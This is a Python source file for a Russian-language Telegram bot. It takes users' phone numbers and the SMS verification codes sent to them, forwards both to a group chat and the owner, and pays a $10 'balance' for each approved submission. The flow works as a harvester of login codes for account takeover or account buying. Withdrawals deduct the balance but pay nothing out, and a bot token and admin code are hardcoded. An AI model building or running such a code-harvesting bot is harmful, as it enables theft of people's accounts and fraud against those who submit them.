import asyncio
import logging
import sqlite3
from datetime import datetime

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
)

# --- КОНФИГ ---
BOT_TOKEN = "9106636927:AAHYZwAyRlilXSacPyGway8S9oxYpoLmCGM"
OWNER_ID = 8874871486
GROUP_ID = -5448015222
SUPPORT_USERNAME = "@Sm_mts"
ADMIN_CODE = "0408"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# --- БАЗА ДАННЫХ (SQLite) ---
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    balance REAL DEFAULT 0,
    reg_date TEXT
)
""")
conn.commit()

def get_user(user_id):
    cursor.execute("SELECT balance, reg_date FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if not row:
        reg = datetime.now().strftime("%Y-%m-%d %H:%M")
        cursor.execute("INSERT INTO users (user_id, balance, reg_date) VALUES (?, ?, ?)", (user_id, 0, reg))
        conn.commit()
        return 0, reg
    return row

def update_balance(user_id, amount):
    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()

def set_balance(user_id, amount):
    cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (amount, user_id))
    conn.commit()

# --- СОСТОЯНИЯ FSM ---
class BananaStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

class WithdrawStates(StatesGroup):
    waiting_amount = State()

class AdminStates(StatesGroup):
    waiting_code = State()
    waiting_broadcast = State()
    waiting_new_text = State()  # для изменения названий кнопок

# --- КЛАВИАТУРЫ ---
def main_keyboard():
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🍌 Сдать банан")],
            [KeyboardButton(text="👤 Профиль"), KeyboardButton(text="🆘 Поддержка")]
        ],
        resize_keyboard=True
    )
    return kb

def owner_decision_keyboard(user_id, phone, code):
    # callback_data содержит user_id, phone и code (phone/code могут содержать +, экранируем просто через разделитель)
    data = f"dec|{user_id}|{phone}|{code}"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да", callback_data=f"yes|{user_id}|{phone}|{code}"),
         InlineKeyboardButton(text="❌ Нет", callback_data=f"no|{user_id}|{phone}|{code}")]
    ])
    return kb

# --- ХЕНДЛЕРЫ ---

@router.message(CommandStart())
async def start(message: Message):
    get_user(message.from_user.id)
    await message.answer(
        "Добро пожаловать! Выберите действие:",
        reply_markup=main_keyboard()
    )

@router.message(F.text == "🍌 Сдать банан")
async def banana_start(message: Message, state: FSMContext):
    await state.set_state(BananaStates.waiting_phone)
    await message.answer(
        "Введите номер телефона в формате:\n+79999999999, 89999999999 или 9999999999",
        reply_markup=ReplyKeyboardRemove()
    )

@router.message(BananaStates.waiting_phone)
async def banana_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    # Простая валидация: длина 10-12, только цифры и возможно +
    clean = phone.replace("+", "")
    if not clean.isdigit() or len(clean) < 10 or len(clean) > 12:
        await message.answer("Неверный формат. Попробуйте снова (пример: +79999999999):")
        return

    await state.update_data(phone=phone)
    # Отправляем номер в группу
    try:
        await bot.send_message(GROUP_ID, f"📞 Новый номер от {message.from_user.id} (@{message.from_user.username}): {phone}")
    except Exception as e:
        logging.error(f"Не удалось отправить в группу: {e}")

    await state.set_state(BananaStates.waiting_code)
    await message.answer("Теперь введите код из SMS:")

@router.message(BananaStates.waiting_code)
async def banana_code(message: Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    phone = data.get("phone")
    user_id = message.from_user.id
    username = message.from_user.username or "без username"

    # Отправляем код в группу с привязкой к номеру
    try:
        await bot.send_message(GROUP_ID, f"🔑 Код для номера {phone} (от {user_id} @{username}): {code}")
    except Exception as e:
        logging.error(f"Не удалось отправить код в группу: {e}")

    # Уведомляем владельца
    try:
        await bot.send_message(
            OWNER_ID,
            f"Новая заявка:\nПользователь: {user_id} (@{username})\nНомер: {phone}\nКод: {code}",
            reply_markup=owner_decision_keyboard(user_id, phone, code)
        )
    except Exception as e:
        logging.error(f"Не удалось отправить владельцу: {e}")

    await message.answer("Ожидайте проверки номера.", reply_markup=main_keyboard())
    await state.clear()

# --- ОБРАБОТКА РЕШЕНИЯ ВЛАДЕЛЬЦА ---
@router.callback_query(F.data.startswith("yes|"))
async def owner_yes(callback: CallbackQuery):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("Нет прав.", show_alert=True)
        return
    _, user_id, phone, code = callback.data.split("|", 3)
    user_id = int(user_id)
    update_balance(user_id, 10.0)
    await callback.message.edit_text(f"✅ Заявка {phone} одобрена. Пользователю {user_id} начислено 10$.")
    try:
        await bot.send_message(user_id, "✅ Ваш номер проверен! На баланс зачислено 10$.")
    except:
        pass
    await callback.answer()

@router.callback_query(F.data.startswith("no|"))
async def owner_no(callback: CallbackQuery):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("Нет прав.", show_alert=True)
        return
    _, user_id, phone, code = callback.data.split("|", 3)
    user_id = int(user_id)
    await callback.message.edit_text(f"❌ Заявка {phone} отклонена.")
    try:
        await bot.send_message(user_id, "Произошла ошибка, попробуйте позже.")
    except:
        pass
    await callback.answer()

# --- ПРОФИЛЬ ---
@router.message(F.text == "👤 Профиль")
async def profile(message: Message):
    balance, reg_date = get_user(message.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw")]
    ])
    await message.answer(
        f"👤 Ваш профиль:\n\n💰 Баланс: {balance}$\n📅 Дата регистрации: {reg_date}",
        reply_markup=kb
    )

@router.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery, state: FSMContext):
    await state.set_state(WithdrawStates.waiting_amount)
    await callback.message.answer("Введите сумму для вывода (в $):")
    await callback.answer()

@router.message(WithdrawStates.waiting_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
    except ValueError:
        await message.answer("Введите корректное число.")
        return
    if amount <= 0:
        await message.answer("Сумма должна быть больше 0.")
        return

    user_id = message.from_user.id
    balance, _ = get_user(user_id)
    if amount > balance:
        await message.answer(f"Недостаточно средств. Ваш баланс: {balance}$")
        return

    # Списываем баланс
    set_balance(user_id, balance - amount)
    username = message.from_user.username or "без username"

    # Уведомляем владельца
    try:
        await bot.send_message(
            OWNER_ID,
            f"💸 Запрос на вывод:\nПользователь: {user_id} (@{username})\nСумма: {amount}$"
        )
    except Exception as e:
        logging.error(f"Ошибка уведомления владельца: {e}")

    await message.answer("Ожидайте вывод.", reply_markup=main_keyboard())
    await state.clear()

# --- ПОДДЕРЖКА ---
@router.message(F.text == "🆘 Поддержка")
async def support(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")]
    ])
    await message.answer(
        "Приветствие! Чтобы написать в Поддержку, нажми на кнопку ниже.",
        reply_markup=kb
    )

# --- АДМИН ПАНЕЛЬ ---
@router.message(Command("admin"))
async def admin_enter(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        await message.answer("Доступ запрещён.")
        return
    await state.set_state(AdminStates.waiting_code)
    await message.answer("Введите код администратора:")

@router.message(AdminStates.waiting_code)
async def admin_check(message: Message, state: FSMContext):
    if message.text.strip() != ADMIN_CODE:
        await message.answer("Неверный код.")
        await state.clear()
        return
    await state.clear()
    # Админ-меню (имитация)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить название кнопок", callback_data="admin_btn_names")],
        [InlineKeyboardButton(text="Изменить описание кнопок", callback_data="admin_btn_desc")],
        [InlineKeyboardButton(text="Изменить цвет кнопок", callback_data="admin_btn_color")],
        [InlineKeyboardButton(text="Изменить фото кнопок", callback_data="admin_btn_photo")],
        [InlineKeyboardButton(text="Старт/Стоп бота", callback_data="admin_toggle")],
        [InlineKeyboardButton(text="Дать объявление всем", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="Статистика", callback_data="admin_stats")],
    ])
    await message.answer("Админ-панель:", reply_markup=kb)

@router.callback_query(F.data.startswith("admin_"))
async def admin_actions(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("Нет прав.", show_alert=True)
        return
    action = callback.data

    if action == "admin_stats":
        cursor.execute("SELECT COUNT(*) FROM users")
        total = cursor.fetchone()[0]
        cursor.execute("SELECT SUM(balance) FROM users")
        total_balance = cursor.fetchone()[0] or 0
        await callback.message.answer(f"📊 Статистика:\nПользователей: {total}\nОбщий баланс: {total_balance}$")
    elif action == "admin_broadcast":
        await state.set_state(AdminStates.waiting_broadcast)
        await callback.message.answer("Введите текст для рассылки всем пользователям:")
    elif action == "admin_toggle":
        await callback.message.answer("Функция Старт/Стоп в разработке (пока бот всегда активен).")
    elif action in ["admin_btn_names", "admin_btn_desc", "admin_btn_color", "admin_btn_photo"]:
        await callback.message.answer("Эта функция требует доработки (изменение клавиатуры на лету). Пока не реализована полностью.")
    await callback.answer()

@router.message(AdminStates.waiting_broadcast)
async def admin_broadcast(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    text = message.text
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    sent = 0
    for (uid,) in users:
        try:
            await bot.send_message(uid, f"📢 Объявление:\n\n{text}")
            sent += 1
        except:
            pass
    await message.answer(f"Рассылка завершена. Отправлено: {sent} из {len(users)}")
    await state.clear()

# --- ЗАПУСК ---
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
